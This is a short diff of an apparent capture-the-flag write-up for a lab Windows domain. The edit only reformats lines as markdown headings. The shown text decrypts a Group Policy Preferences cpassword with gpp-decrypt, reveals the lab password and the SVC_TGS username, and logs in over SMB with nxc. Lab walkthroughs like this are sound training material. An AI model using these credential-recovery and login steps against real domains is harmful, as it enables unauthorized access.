@@ -148,10 +148,10 @@ using gpp-decrpyt we can get the password.
 
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 
-we get the password: GPPstillStandingStrong2k18
-we also get the username SVC_TGS from the spiderplus report from out of nxc
+## we get the password: GPPstillStandingStrong2k18
+## we also get the username SVC_TGS from the spiderplus report from out of nxc
 
-now LETS USE THESE CREDENTIALS TO LOG IN:
+# now LETS USE THESE CREDENTIALS TO LOG IN:
 
 nxc smb 10.129.76.174 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
 
